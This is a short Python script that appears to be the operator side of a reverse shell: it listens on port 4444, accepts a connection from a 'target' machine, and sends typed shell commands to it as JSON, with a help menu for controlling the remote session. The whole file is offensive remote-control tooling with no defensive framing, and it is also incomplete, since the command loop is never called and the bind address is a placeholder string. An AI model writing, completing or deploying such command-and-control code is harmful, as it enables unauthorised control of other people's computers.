import socket
import termcolor
from termcolor import colored
import json

def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def t_commun():
    count = 0
    while True:
        comm = input('* Shell~%s: ' % str(ip))
        data_send(comm)
        if comm == 'exit':
            break
        elif comm == 'help':
            print(colored('''\n
            exit: Close the session on the Target Machine
            cd + "DirectoryName": Change the Directory on the Target Machine
            help: Help the user to use the commands.
            '''))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('ip', 4444))
print(colored('[-] Waiting for connections', 'green'))
sock.listen(5)

target, ip = sock.accept()